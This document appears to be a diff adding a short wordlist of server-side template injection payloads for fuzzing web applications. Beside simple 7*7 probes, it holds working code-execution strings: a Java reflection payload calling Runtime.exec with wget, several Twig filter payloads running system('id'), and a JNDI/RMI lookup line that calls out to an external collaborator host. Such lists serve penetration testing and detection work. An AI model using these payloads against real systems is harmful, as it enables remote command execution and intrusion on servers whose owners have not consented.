@@ -1,0 +1,14 @@
+%23set%20($a=7*7)%20${a}
+dest=%23set%20($a=7*7)%20${a}
+${("".getClass()).forName("java.lang".concat(“.Runtime")).getMethods() [6].invoke(("".getClass()).forName("java.lang".concat(“.Runtime"))).exec("wget ")}
+{{['id']|filter('system')}}
+{{[0]|reduce('system','id')}}
+{{['id']|map('system')|join}}
+{{['id',1]|sort('system')|join}}
+{{7*7}} 
+#{{7*7}} 
+${{7*7}} %{{7*7}} 
+{7*7} 
+__${7*7}__:: 
+[[(7*7)]]
+${${lower:jndi}:${lower:rmi}://${hostName}.{{burp}}/s2edwin}
